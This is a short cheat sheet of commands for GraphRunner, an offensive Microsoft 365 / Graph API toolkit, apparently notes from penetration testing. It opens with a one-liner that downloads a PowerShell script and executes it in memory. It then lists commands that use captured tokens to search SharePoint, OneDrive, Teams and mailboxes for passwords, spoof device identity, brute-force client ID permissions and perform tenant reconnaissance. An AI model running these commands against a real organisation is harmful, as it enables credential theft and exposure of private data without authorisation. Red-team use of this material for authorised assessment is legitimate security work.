# GraphRunner

## Command to execute: 

    IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1') | iex

### Commands:

#### 1) Lists all modules of graphrunner

    List-GraphRunnerModules

#### 2) Authenticate with valid credentials to open a graph API session

    Get-GraphTokens -UserPasswordAuth 

#### 3) Search for files on OneDrive and Sharepoint containing the string "password" by using the tokens we dumped from the Graph API session

    Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password' 

#### 4) Search all Teams channels with the specific term that are readable by our user

    Invoke-SearchTeams -Tokens $tokens -SearchTerm password 

#### 5) Searches the mailbox of our current user

    Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40

#### 6) Emulates other devices when requesting tokens
   
    Get-GraphTokens -Device AndroidMobile -Browser Android 

#### 7) Check for non-default permissions that our user might have

    Invoke-BruteClientIDAccess -domain DOMAIN.LOCAL -refreshToken $tokens.refresh_token 

#### 8) Perform recon on the tenant

    Invoke-GraphRecon -Tokens $tokens 



